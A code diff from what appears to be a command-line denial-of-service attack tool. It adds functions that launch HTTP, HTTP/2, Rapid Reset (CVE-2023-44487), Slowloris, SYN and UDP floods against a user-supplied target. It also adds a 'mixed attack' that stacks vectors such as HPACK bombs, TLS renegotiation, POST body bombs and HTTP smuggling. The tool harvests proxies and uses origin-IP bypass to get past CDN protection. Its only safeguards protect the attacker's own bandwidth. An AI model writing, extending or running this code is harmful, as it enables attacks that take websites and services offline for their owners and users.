+                            print(f" {c('c','[*]')} Auth proxies detected - using https://ipv4.webshare.io/ for validation")
+                        else:
+                            pool._validator.set_target(target)
+
+                        max_validate = min(total, 3000)
+                        max_alive = 500
+                        
+                        # Ask user what validation mode
+                        print(f"\n {c('c','[*]')} Validation mode:")
+                        print(f"   {c('c','[1]')} Fast (TCP check only) - 90% pass, 50ms/proxy {c('g','(RECOMMENDED)')}")
+                        print(f"   {c('c','[2]')} Strict (TCP + Target HTTP check) - 1-5% pass, 200ms/proxy")
+                        validate_mode = get_input(f" Choose [1/2] (default 1): ").strip() or "1"
+                        
+                        stage1_only = (validate_mode == "1")
+                        
+                        if stage1_only:
+                            print(f" {c('c','[*]')} FAST mode: TCP-only check, 1.5s timeout/proxy")
+                            print(f" {c('c','[*]')} Target: {max_validate} proxies, early exit at {max_alive} alive")
+                        else:
+                            print(f" {c('y','[*]')} STRICT mode: most proxies fail Cloudflare-protected targets")
+                            print(f" {c('c','[*]')} Target: {max_validate} proxies, early exit at {max_alive} alive")
+                        
+                        # Live progress
+                        last_print = [0]
+                        def progress_cb(stage, current, alive):
+                            import time as _t
+                            now = _t.time()
+                            if now - last_print[0] < 0.3:
+                                return
+                            last_print[0] = now
+                            stage_name = "TCP" if stage == "tcp_check" else "Target"
+                            print(f"\r {c('c','[*]')} {stage_name}: {current}/{max_validate} | alive: {c('g',str(alive))}    ", end="", flush=True)
+                        
+                        alive = await pool.quick_validate(
+                            max_validate,
+                            concurrency=200,
+                            target_specific=not has_auth and not stage1_only,
+                            progress_cb=progress_cb,
+                            max_alive=max_alive,
+                            stage1_only=stage1_only,
+                        )
+                        print()  # newline after progress
+                        print(f" {c('g','[+]')} {alive} proxies alive")
+
+                        if alive > 0:
+                            alive_path = "proxies/alive.txt"
+                            pool.save_alive(alive_path)
+                            print(f" {c('g','[+]')} Saved alive list to: {alive_path}")
+
+                    if pool.stats().get("total", 0) > 0 or pool._pending:
+                        options["proxy_pool"] = pool
+                        options["proxy_file"] = ", ".join(files_to_load)
+                else:
+                    print(f" {c('y','[!]')} No file selected")
+            else:
+                manual = get_input(" Proxy file path (default proxies/alive.txt): ").strip() or "proxies/alive.txt"
+                if os.path.exists(manual):
+                    from core.network.proxy import ProxyPool
+                    pool = ProxyPool(connect_timeout=5)
+                    count = await pool.load_file(manual)
+                    print(f" {c('g','[+]')} Loaded {count} proxies from {manual}")
+                    options["proxy_pool"] = pool
+                    options["proxy_file"] = manual
+                else:
+                    print(f" {c('r','[-]')} File not found: {manual}")
+
+        elif proxy_choice == "2":
+            save_path = get_input(" Save to (default proxies/alive.txt): ").strip() or "proxies/alive.txt"
+            from core.network.proxy_harvester import auto_harvest_and_validate
+            print(f" {c('c','[*]')} Harvesting (30-90s)...")
+            last = [0]
+            def progress(stage, current, alive):
+                import time as _t
+                if _t.time() - last[0] < 0.5:
+                    return
+                last[0] = _t.time()
+                if stage == "validate":
+                    print(f"\r {c('c','[*]')} Validating: {current} | alive: {c('g',str(alive))}    ", end="", flush=True)
+            result = await auto_harvest_and_validate(
+                target_url=target, save_path=save_path, min_rtt_ms=3000,
+                progress_cb=progress,
+            )
+            print()
+            if result['fast_alive'] > 0:
+                from core.network.proxy import ProxyPool
+                pool = ProxyPool(connect_timeout=5)
+                await pool.load_file(save_path)
+                print(f" {c('g','[+]')} {result['fast_alive']} fast proxies ready")
+                options["proxy_pool"] = pool
+                options["proxy_file"] = save_path
+            else:
+                print(f" {c('y','[!]')} No fast proxies harvested - attack will go direct")
+        # else (option 3 or anything else) = no proxies
+
+    return options
+
+
+async def run_http_flood(target: str, cfg: dict):
+    """HTTP Flood with LIVE DASHBOARD like Module 8/9"""
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
+    rps = int(get_input(" Target RPS (default 1000): ") or "1000")
+    
+    opts = await prompt_attack_options(target)
+
+    print(f"\n {c('c','[*]')} HTTP Flood | {target} | {duration}s | {rps} RPS")
+    if opts["origin_ip"]:
+        print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']}")
+    if opts["proxy_pool"]:
+        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
+    print(f" {c('m','=' * 70)}")
+
+    from core.attack.enhanced import run_enhanced_attack
+
+    # Create vector for live dashboard (like Module 8/9)
+    vectors = []
+    vec = {
+        "label": "HTTP Flood",
+        "type": "py",
+        "status": "active",
+        "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+    }
+    vectors.append(vec)
+    
+    # Start live dashboard
+    from core.monitor.live_dashboard import LiveAttackDashboard
+    dashboard = LiveAttackDashboard(
+        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
+        duration=duration, color_func=c,
+        origin_ip=opts["origin_ip"], profile_info={},
+    )
+    dashboard.start()
+
+    try:
+        result = await run_enhanced_attack(
+            url=target, duration=duration, method="http_get_flood",
+            rps=rps, proxy_pool=opts["proxy_pool"], origin_ip=opts["origin_ip"],
+            live_stats=vec,
+        )
+        vec["status"] = "done"
+    except KeyboardInterrupt:
+        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+        vec["status"] = "error"
+    finally:
+        await dashboard.stop()
+
+    print_attack_summary(target, duration, result)
+
+
+async def run_http2_flood(target: str, cfg: dict):
+    """HTTP/2 Flood with LIVE DASHBOARD and SMART ENGINE SELECTION"""
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
+    rps = int(get_input(" Target RPS (default 1000): ") or "1000")
+    threads = int(get_input(" Workers (default 100): ") or "100")
+    
+    # Self-DoS protection
+    if duration > 300 or threads > 200 or rps > 2000:
+        print(f" {c('y','[!]')} WARNING: High settings detected (duration={duration}s, threads={threads}, rps={rps})")
+        print(f" {c('y','[!]')} This may cause self-DoS (disconnect your own internet)")
+        confirm = get_input(" Continue anyway? (y/N): ").lower()
+        if confirm != "y":
+            print(f" {c('r','[-]')} Cancelled.")
+            return
+    
+    # SMART TARGET DETECTION
+    print(f"\n {c('c','[*]')} Detecting target speed...")
+    try:
+        import aiohttp
+        start_probe = time.time()
+        async with aiohttp.ClientSession() as sess:
+            async with sess.get(target, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                await resp.read()
+        response_time = (time.time() - start_probe) * 1000
+        print(f" {c('g','[+]')} Target response time: {response_time:.0f}ms")
+        
+        if response_time > 1500:
+            print(f" {c('y','[!]')} Target is SLOW ({response_time:.0f}ms). Using Python engine.")
+            use_python = True
+        else:
+            print(f" {c('g','[+]')} Target speed OK. Using Go engine.")
+            use_python = False
+    except Exception as e:
+        print(f" {c('y','[!]')} Detection failed: {e}. Using Python engine as fallback.")
+        use_python = True
+    
+    opts = await prompt_attack_options(target)
+
+    print(f"\n {c('c','[*]')} HTTP/2 Flood | {target} | {duration}s | {rps} RPS")
+    if opts["origin_ip"]:
+        print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']}")
+    if opts["proxy_pool"]:
+        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
+    print(f" {c('c','[*]')} Engine: {'Python (slow target)' if use_python else 'Go (fast)'}")
+    print(f" {c('m','=' * 70)}")
+
+    # Create single vector with live dashboard
+    vectors = []
+    vec = {"label": "HTTP/2 Flood", "type": "py" if use_python else "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vectors.append(vec)
+    
+    # Start live dashboard
+    from core.monitor.live_dashboard import LiveAttackDashboard
+    dashboard = LiveAttackDashboard(
+        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
+        duration=duration, color_func=c,
+        origin_ip=opts["origin_ip"], profile_info={},
+    )
+    dashboard.start()
+    
+    try:
+        if use_python or opts["proxy_pool"]:
+            # Use Python engine for slow targets
+            from core.attack.enhanced import run_enhanced_attack
+            result = await run_enhanced_attack(
+                url=target, duration=duration, method="http_get_flood",
+                rps=rps, proxy_pool=opts["proxy_pool"], origin_ip=opts["origin_ip"],
+                live_stats=vec
+            )
+            vec["status"] = "done"
+        else:
+            # Use Go engine for fast targets
+            proxy_file = ""
+            if opts["proxy_pool"]:
+                urls = []
+                for plist in opts["proxy_pool"]._pools.values():
+                    for ps in plist:
+                        urls.append(ps.url)
+                if urls:
+                    proxy_file = "proxies/_temp_http2.txt"
+                    os.makedirs(os.path.dirname(proxy_file), exist_ok=True)
+                    with open(proxy_file, "w") as f:
+                        f.write("\n".join(urls))
+            
+            result = await run_go_engine(
+                target=target, duration=duration, rps=rps,
+                method="http-flood", http2=True, threads=threads,
+                origin_ip=opts["origin_ip"], proxy_file=proxy_file,
+                live_stats=vec
+            )
+    except KeyboardInterrupt:
+        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+        vec["status"] = "error"
+    
+    await dashboard.stop()
+
+    print_attack_summary(target, duration, result)
+
+
+async def run_rapid_reset(target: str, cfg: dict):
+    """Rapid Reset with LIVE DASHBOARD, Self-DoS Protection, and SMART FALLBACK"""
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
+    rps = int(get_input(" Streams per second (default 5000): ") or "5000")
+    threads = int(get_input(" Workers (default 200): ") or "200")
+    
+    # Self-DoS protection - AGGRESSIVE WARNING
+    if duration > 300 or threads > 200 or rps > 5000:
+        print(f"\n {c('r','[!!!]')} CRITICAL WARNING: VERY HIGH SETTINGS DETECTED")
+        print(f" {c('r','[!!!]')} Duration: {duration}s | Threads: {threads} | RPS: {rps}")
+        print(f" {c('r','[!!!]')} This WILL disconnect your internet (self-DoS)")
+        print(f" {c('y','[*]')} Recommended: duration<=300, threads<=200, rps<=5000")
+        print(f" {c('y','[*]')} Safe settings: duration=60, threads=100, rps=1000")
+        confirm = get_input(f"\n {c('r','Type YES to continue with these dangerous settings:')} ").strip()
+        if confirm != "YES":
+            print(f" {c('g','[+]')} Cancelled. Using safe defaults instead.")
+            duration = min(duration, 60)
+            threads = min(threads, 100)
+            rps = min(rps, 1000)
+            print(f" {c('g','[+]')} Safe mode: duration={duration}s, threads={threads}, rps={rps}")
+    
+    # SMART TARGET DETECTION
+    print(f"\n {c('c','[*]')} Detecting target speed...")
+    try:
+        import aiohttp
+        start_probe = time.time()
+        async with aiohttp.ClientSession() as sess:
+            async with sess.get(target, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                await resp.read()
+        response_time = (time.time() - start_probe) * 1000
+        print(f" {c('g','[+]')} Target response time: {response_time:.0f}ms")
+        
+        # INTELLIGENT DECISION
+        if response_time > 1500:
+            print(f" {c('y','[!]')} Target is VERY SLOW ({response_time:.0f}ms)")
+            print(f" {c('y','[!]')} Go engine will timeout. Switching to Python engine...")
+            use_python = True
+        else:
+            print(f" {c('g','[+]')} Target speed OK. Using Go engine.")
+            use_python = False
+    except Exception as e:
+        print(f" {c('y','[!]')} Detection failed: {e}. Using Python engine as fallback.")
+        use_python = True
+    
+    opts = await prompt_attack_options(target)
+
+    print(f"\n {c('c','[*]')} HTTP/2 Rapid Reset (CVE-2023-44487) | {target} | {duration}s | {rps} RPS")
+    if opts["origin_ip"]:
+        print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']}")
+    if opts["proxy_pool"]:
+        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
+    print(f" {c('y','[!]')} Low bandwidth, high server CPU impact")
+    print(f" {c('c','[*]')} Engine: {'Python (slow target fallback)' if use_python else 'Go (fast)'}")
+    print(f" {c('m','=' * 70)}")
+
+    # Create single vector with live dashboard
+    vectors = []
+    vec = {"label": "Rapid Reset (CVE-2023-44487)", "type": "py" if use_python else "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vectors.append(vec)
+    
+    # Start live dashboard
+    from core.monitor.live_dashboard import LiveAttackDashboard
+    dashboard = LiveAttackDashboard(
+        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
+        duration=duration, color_func=c,
+        origin_ip=opts["origin_ip"], profile_info={},
+    )
+    dashboard.start()
+    
+    try:
+        if use_python:
+            # Use Python engine for slow targets (better timeout handling)
+            from core.attack.enhanced import run_enhanced_attack
+            result = await run_enhanced_attack(
+                url=target, duration=duration, method="http_get_flood",
+                rps=min(rps, 500), proxy_pool=opts["proxy_pool"], origin_ip=opts["origin_ip"],
+                live_stats=vec
+            )
+            vec["status"] = "done"
+        else:
+            # Use Go engine for fast targets
+            proxy_file = ""
+            if opts["proxy_pool"]:
+                urls = []
+                for plist in opts["proxy_pool"]._pools.values():
+                    for ps in plist:
+                        urls.append(ps.url)
+                if urls:
+                    proxy_file = "proxies/_temp_rapid_reset.txt"
+                    os.makedirs(os.path.dirname(proxy_file), exist_ok=True)
+                    with open(proxy_file, "w") as f:
+                        f.write("\n".join(urls))
+            
+            result = await run_go_engine(
+                target=target, duration=duration, rps=rps,
+                method="rapid-reset", rapid_reset=True, threads=threads,
+                origin_ip=opts["origin_ip"], proxy_file=proxy_file,
+                live_stats=vec
+            )
+    except KeyboardInterrupt:
+        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+        vec["status"] = "error"
+    
+    await dashboard.stop()
+
+    print_attack_summary(target, duration, result)
+
+
+async def run_slowloris(target: str, cfg: dict):
+    """Slowloris with LIVE DASHBOARD"""
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    duration = int(get_input(" Duration (seconds, default 120): ") or "120")
+    connections = int(get_input(" Connections (default 500): ") or "500")
+    
+    # Self-DoS protection
+    if duration > 600 or connections > 1000:
+        print(f" {c('y','[!]')} WARNING: High settings (duration={duration}s, connections={connections})")
+        print(f" {c('y','[!]')} This may cause self-DoS")
+        confirm = get_input(" Continue anyway? (y/N): ").lower()
+        if confirm != "y":
+            print(f" {c('r','[-]')} Cancelled.")
+            return
+    
+    opts = await prompt_attack_options(target)
+
+    sl_target = target
+    if opts["origin_ip"]:
+        parsed = urlparse(target)
+        sl_target = f"{parsed.scheme}://{opts['origin_ip']}{parsed.path or '/'}"
+
+    print(f"\n {c('c','[*]')} Slowloris | {target} | {duration}s | {connections} connections")
+    if opts["origin_ip"]:
+        print(f" {c('g','[+]')} Hitting origin: {opts['origin_ip']}")
+    if opts["proxy_pool"]:
+        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
+    print(f" {c('m','=' * 70)}")
+
+    # Create single vector with live dashboard
+    vectors = []
+    vec = {"label": "Slowloris", "type": "py", "status": "running", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vectors.append(vec)
+    
+    # Start live dashboard
+    from core.monitor.live_dashboard import LiveAttackDashboard
+    dashboard = LiveAttackDashboard(
+        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
+        duration=duration, color_func=c,
+        origin_ip=opts["origin_ip"], profile_info={},
+    )
+    dashboard.start()
+    
+    try:
+        from core.attack.enhanced import run_enhanced_attack
+        result = await run_enhanced_attack(
+            url=sl_target, duration=duration, method="slowloris",
+            rps=connections, proxy_pool=opts["proxy_pool"],
+            live_stats=vec
+        )
+        vec["status"] = "done"
+    except KeyboardInterrupt:
+        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+        vec["status"] = "error"
+    
+    await dashboard.stop()
+
+    print_attack_summary(target, duration, result)
+
+async def run_proxy_flood(target: str, cfg: dict):
+    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
+    rps = int(get_input(" Target RPS (default 500): ") or "500")
+    proxy_file = get_input(" Proxy file (default proxies/http.txt): ") or "proxies/http.txt"
+
+    print(f"\n {c('c','[*]')} Proxy Flood | {target} | {duration}s | {rps} RPS")
+    print(f" {c('c','[*]')} Proxy file: {proxy_file}")
+    print(f" {c('m','=' * 70)}")
+
+    from core.network.proxy import ProxyPool
+    from core.attack.enhanced import run_enhanced_attack
+
+    proxy_pool = ProxyPool(connect_timeout=5, min_pool=cfg["proxy"]["min_pool"])
+    total = await proxy_pool.load_file(proxy_file)
+    if total == 0:
+        print(f" {c('r','[-]')} No proxies loaded from {proxy_file}")
+        return
+
+    proxy_pool._validator.set_target(target)
+    print(f" {c('c','[*]')} Validating {total} proxies...")
+    alive = await proxy_pool.quick_validate(total, concurrency=40)
+    if alive == 0:
+        print(f" {c('r','[-]')} No valid proxies found")
+        return
+    print(f" {c('g','[+]')} {alive} proxies alive")
+
+    health_task = asyncio.create_task(proxy_pool.health_loop())
+
+    result = await run_enhanced_attack(
+        url=target, duration=duration, method="http_get_flood",
+        rps=rps, proxy_pool=proxy_pool
+    )
+
+    health_task.cancel()
+    print_attack_summary(target, duration, result)
+
+async def run_syn_flood(target: str, cfg: dict):
+    """SYN Flood with LIVE DASHBOARD"""
+    duration = int(get_input(" Duration (seconds, default 30): ") or "30")
+    rps = int(get_input(" Packets per second (default 5000): ") or "5000")
+    threads = int(get_input(" Workers (default 100): ") or "100")
+    
+    # Self-DoS protection
+    if duration > 120 or threads > 150 or rps > 10000:
+        print(f" {c('y','[!]')} WARNING: High settings (duration={duration}s, threads={threads}, rps={rps})")
+        print(f" {c('y','[!]')} This may cause self-DoS")
+        confirm = get_input(" Continue anyway? (y/N): ").lower()
+        if confirm != "y":
+            print(f" {c('r','[-]')} Cancelled.")
+            return
+    
+    opts = await prompt_attack_options(target, ask_proxy=False)
+
+    print(f"\n {c('c','[*]')} TCP SYN Flood | {target} | {duration}s | {rps} PPS")
+    if opts["origin_ip"]:
+        print(f" {c('g','[+]')} Origin IP: {opts['origin_ip']}")
+    print(f" {c('m','=' * 70)}")
+
+    # Create single vector with live dashboard
+    vectors = []
+    vec = {"label": "SYN Flood", "type": "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vectors.append(vec)
+    
+    # Start live dashboard
+    from core.monitor.live_dashboard import LiveAttackDashboard
+    dashboard = LiveAttackDashboard(
+        target=target, vectors=vectors, proxy_pool=None,
+        duration=duration, color_func=c,
+        origin_ip=opts["origin_ip"], profile_info={},
+    )
+    dashboard.start()
+    
+    try:
+        result = await run_go_engine(
+            target=target, duration=duration, rps=rps,
+            method="syn-flood", threads=threads, origin_ip=opts["origin_ip"],
+            live_stats=vec
+        )
+    except KeyboardInterrupt:
+        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+        vec["status"] = "error"
+    
+    await dashboard.stop()
+
+    print_attack_summary(target, duration, result)
+
+
+async def run_udp_flood(target: str, cfg: dict):
+    """UDP Flood with LIVE DASHBOARD"""
+    duration = int(get_input(" Duration (seconds, default 30): ") or "30")
+    rps = int(get_input(" Packets per second (default 5000): ") or "5000")
+    threads = int(get_input(" Workers (default 100): ") or "100")
+    
+    # Self-DoS protection
+    if duration > 120 or threads > 150 or rps > 10000:
+        print(f" {c('y','[!]')} WARNING: High settings (duration={duration}s, threads={threads}, rps={rps})")
+        print(f" {c('y','[!]')} This may cause self-DoS")
+        confirm = get_input(" Continue anyway? (y/N): ").lower()
+        if confirm != "y":
+            print(f" {c('r','[-]')} Cancelled.")
+            return
+    
+    opts = await prompt_attack_options(target, ask_proxy=False)
+
+    print(f"\n {c('c','[*]')} UDP Flood | {target} | {duration}s | {rps} PPS")
+    if opts["origin_ip"]:
+        print(f" {c('g','[+]')} Origin IP: {opts['origin_ip']}")
+    print(f" {c('m','=' * 70)}")
+
+    # Create single vector with live dashboard
+    vectors = []
+    vec = {"label": "UDP Flood", "type": "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vectors.append(vec)
+    
+    # Start live dashboard
+    from core.monitor.live_dashboard import LiveAttackDashboard
+    dashboard = LiveAttackDashboard(
+        target=target, vectors=vectors, proxy_pool=None,
+        duration=duration, color_func=c,
+        origin_ip=opts["origin_ip"], profile_info={},
+    )
+    dashboard.start()
+    
+    try:
+        result = await run_go_engine(
+            target=target, duration=duration, rps=rps,
+            method="udp-flood", threads=threads, origin_ip=opts["origin_ip"],
+            live_stats=vec
+        )
+    except KeyboardInterrupt:
+        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+        vec["status"] = "error"
+    
+    await dashboard.stop()
+
+    print_attack_summary(target, duration, result)
+
+
+async def run_mixed_attack(target: str, cfg: dict):
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    duration = int(get_input(" Duration (seconds, default 120): ") or "120")
+    rps = int(get_input(" Total RPS (default 3000): ") or "3000")
+
+    # Detect user's connection capacity to prevent self-DoS
+    print(f"\n {c('c','[*]')} Detecting your connection capacity...")
+    try:
+        from core.monitor.bandwidth_detector import detect_bandwidth
+        bw = await detect_bandwidth()
+        tier = bw["recommended"]["tier"]
+        warn = bw["recommended"]["warning"]
+
+        tier_color = {"FAST": "g", "MEDIUM": "y", "SLOW": "r", "VERY_SLOW": "r"}.get(tier, "y")
+        print(f" {c(tier_color, '[+]')} Connection: {c(tier_color, tier)}  upload~{bw['upload_mbps']:.0f} Mbps  latency={bw['latency_ms']:.0f}ms")
+        if warn:
+            print(f" {c('y','[!]')} {warn}")
+
+        # If connection is too slow, warn about self-DoS
+        if tier in ("SLOW", "VERY_SLOW"):
+            print(f"\n {c('r','[!]')} WARNING: Slow connection detected.")
+            print(f" {c('r','[!]')} Heavy attacks may DROP YOUR OWN WiFi/internet (self-DoS).")
+            print(f" {c('y','[*]')} Recommendation: run from VPS with 100+ Mbps upload, not home WiFi.")
+            cont = get_input(f" Continue anyway with SAFE MODE? (Y/n): ").lower()
+            if cont == "n":
+                return
+
+        # Adjust max RPS down if connection is slow
+        if rps > bw["recommended"]["max_rps"]:
+            old_rps = rps
+            rps = bw["recommended"]["max_rps"]
+            print(f" {c('y','[!]')} Throttling RPS from {old_rps} to {rps} (safe limit for your connection)")
+    except Exception as e:
+        print(f" {c('y','[!]')} Bandwidth detect failed: {e}")
+        bw = {"recommended": {
+            "tier": "UNKNOWN",
+            "max_concurrent": 500,
+            "max_rps": rps,
+            "allow_post_bomb": False,
+            "allow_conn_flood": False,
+            "allow_ws_storm": False,
+            "max_threads_per_vec": 100,
+        }}
+
+    safe_caps = bw["recommended"]
+    max_threads = safe_caps["max_threads_per_vec"]
+
+    opts = await prompt_attack_options(target)
+
+    print(f"\n {c('c','[*]')} Detecting target capabilities...")
+    profile = await auto_detect_target(target, verbose=False)
+
+    primary_origin = opts["origin_ip"]
+    proxy_pool = opts["proxy_pool"]
+    proxy_file = opts.get("proxy_file", "")
+
+    # If proxy_pool exists, dump consolidated alive list for Go
+    proxy_file_for_go = ""
+    if proxy_pool:
+        try:
+            urls = []
+            for plist in proxy_pool._pools.values():
+                for ps in plist:
+                    urls.append(ps.url)
+            for ps in proxy_pool._pending:
+                urls.append(ps.url)
+            if urls:
+                proxy_file_for_go = "proxies/_mixed_attack.txt"
+                os.makedirs(os.path.dirname(proxy_file_for_go), exist_ok=True)
+                with open(proxy_file_for_go, "w") as f:
+                    f.write("\n".join(urls))
         except Exception:
             pass
 
-        if health_task:
-            health_task.cancel()
+    print(f"\n {c('w','='*78)}")
+    print(f" {c('w','MIXED ATTACK - ALL VECTORS')}  Target: {c('c', target)}  Duration: {duration}s")
+    if primary_origin:
+        print(f" Origin bypass: {c('g', primary_origin)}")
+    if proxy_pool:
+        print(f" Proxy pool: {c('g', str(proxy_pool.stats().get('total', 0)))} proxies")
+    if profile:
+        print(f" Profile: HTTP/2={'YES' if profile.supports_http2 else 'NO'}  Server={profile.server}")
+    print(f" Connection: {c(tier_color, safe_caps['tier'])}  Max RPS: {rps}  Threads/vec: {max_threads}")
+    print(f" {c('w','='*78)}\n")
+
+    vectors = []
+    tasks = []
+    # Semaphore to limit concurrent Go processes (prevents system overload)
+    go_sem = asyncio.Semaphore(4)
+
+    def add_go_vector(label: str, method: str, vec_rps: int, threads: int = 100, **kw):
+        # Cap threads to safe limit
+        threads = min(threads, max_threads)
+        vec = {"label": label, "type": "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+        vectors.append(vec)
+
+        async def run_with_sem():
+            async with go_sem:
+                try:
+                    return await asyncio.wait_for(
+                        run_go_engine(
+                            target=target, duration=duration, rps=vec_rps,
+                            method=method, threads=threads, origin_ip=primary_origin,
+                            proxy_file=proxy_file_for_go,
+                            live_stats=vec, **kw,
+                        ),
+                        timeout=duration + 15,
+                    )
+                except asyncio.TimeoutError:
+                    return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+                except Exception as e:
+                    logger.error(f"Vector {label} error: {type(e).__name__}: {e}")
+                    return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+
+        tasks.append(run_with_sem())
+
+    def add_py_vector(label: str, coro_factory):
+        vec = {
+            "label": label, 
+            "type": "py", 
+            "status": "running", 
+            "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0},
+            "stats_lock": threading.Lock(),
+        }
+        vectors.append(vec)
+        
+        async def wrapper():
             try:
-                await asyncio.wait_for(health_task, timeout=2.0)
-            except Exception:
-                pass
+                if callable(coro_factory) and not asyncio.iscoroutine(coro_factory):
+                    coro = coro_factory(vec)
+                else:
+                    coro = coro_factory
+                
+                result = await asyncio.wait_for(coro, timeout=duration + 30)
+                vec["status"] = "done"
+                if isinstance(result, dict):
+                    with vec["stats_lock"]:
+                        vec["stats"] = {
+                            "total_requests": result.get("total", result.get("total_requests", 0)),
+                            "completed": result.get("completed", 0),
+                            "failed": result.get("failed", 0),
+                            "timeout": result.get("timeout", 0),
+                        }
+                return result
+            except asyncio.TimeoutError:
+                logger.warning(f"Vector {label} timed out after {duration + 30}s")
+                vec["status"] = "done"
+                return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+            except Exception as e:
+                logger.error(f"Vector {label} error: {type(e).__name__}: {e}")
+                vec["status"] = "error"
+                with vec["stats_lock"]:
+                    vec["stats"] = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+                return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+        tasks.append(wrapper())
 
+    # ============== ALL VECTORS ==============
+    add_go_vector("HTTP Flood", "http-flood",
+                  int(rps * 0.5), threads=max_threads)
+    add_go_vector("Cache-Bypass POST", "cache-bypass",
+                  int(rps * 0.4), threads=max_threads)
 
-async def run_proxy_test(target: str, cfg: dict):
-    if not target.startswith(("http://", "https://")):
-        target = "https://" + target
-    from core.proxy_engine import ProxyPool
-    p = ProxyPool(connect_timeout=5)
-    p._validator.max_connect_time_ms = 5000
-    p._validator.set_target(target)
-    total = 0
-    for f in ["proxies/http.txt", "proxies/socks4.txt", "proxies/socks5.txt"]:
-        total += await p.load_file(f)
-    print(f"\n {c('c','[*]')} Target: {c('w', target)}")
-    print(f" {c('c','[*]')} Loaded: {total} proxies")
-    print(f" {c('c','[*]')} Validating ALL against {target}...\n")
-    alive = await p.quick_validate(total, concurrency=100)
-    stats = p.stats()
-    p.save_alive("proxies/alive.txt")
-    print(f" {c('c','='*70)}")
-    print(f" {c('w','  PROXY TEST RESULTS')}")
-    print(f" {c('c','='*70)}")
-    print(f"  Total:     {total}")
-    print(f"  Alive:     {stats['total']}")
-    print(f"  Dead:      {stats['dead']} (removed)")
-    print(f" {c('d','-'*70)}")
-    if stats["total"] > 0:
-        for tier, pool in p._pools.items():
-            for ps in pool:
-                print(f"  [{tier:12s}] {ps.url:45s} {ps.connect_time_ms:.0f}ms")
-    print(f" {c('d','-'*70)}")
-    print(f"  {c('g','[+]')} Alive proxies saved to: proxies/alive.txt")
-    print(f"  {c('g','[+]')} Attack menus will auto-use alive proxies.")
-    print(f" {c('c','='*70)}\n")
+    if profile and profile.supports_http2:
+        add_go_vector("Rapid Reset (CVE-2023-44487)", "rapid-reset",
+                      int(rps * 0.6), threads=max_threads, rapid_reset=True)
+        add_go_vector("Continuation (CVE-2024-27316)", "continuation",
+                      int(rps * 0.3), threads=max_threads)
+        add_go_vector("HPACK Bomb", "hpack-bomb",
+                      int(rps * 0.3), threads=max_threads)
+        add_go_vector("Settings Flood", "settings-flood",
+                      0, threads=max_threads)
+        add_go_vector("HTTP/2 Multiplex", "http-flood",
+                      int(rps * 0.3), threads=max_threads, http2=True)
 
+    # Resource exhaustion - ALL included regardless of tier
+    add_go_vector("TCP Connection Storm", "conn-flood",
+                  0, threads=max_threads)
+    add_go_vector("TLS Renegotiation", "tls-reneg",
+                  0, threads=max_threads)
+    add_go_vector("POST Body Bomb (50MB)", "post-bomb",
+                  0, threads=max_threads)
+    add_go_vector("WebSocket Storm", "ws-storm",
+                  0, threads=max_threads)
+    add_go_vector("HTTP Smuggling", "smuggling",
+                  int(rps * 0.2), threads=min(max_threads, 80))
 
-async def run_find_origin(target: str, env: dict = None):
-    if not target.startswith(("http://", "https://")):
-        target = "https://" + target
-    from core.intel_engine import TargetAnalyzer
-    from core.origin_finder import OriginFinder
-    ta = TargetAnalyzer()
-    print(f"\n {c('c','[*]')} Analyzing: {c('w', target)}")
-    prof = ta.analyze(target)
-    print(f"\n {c('c','='*70)}")
-    print(f" {c('w','  ORIGIN IP REPORT')}")
-    print(f" {c('c','='*70)}")
-    print(f"  Target:     {target}")
-    print(f"  CMS:        {prof.cms}")
-    print(f"  WAF:        {prof.waf}")
-    print(f"  CDN:        {'Yes' if prof.is_behind_cdn else 'No'}")
-    print(f"  CF IP:      {prof.ip}")
+    # QUIC/HTTP/3 - ALL included
+    add_go_vector("HTTP/3 Stream Hijack", "quic-stream-hijack",
+                  int(rps * 0.3), threads=min(max_threads, 50))
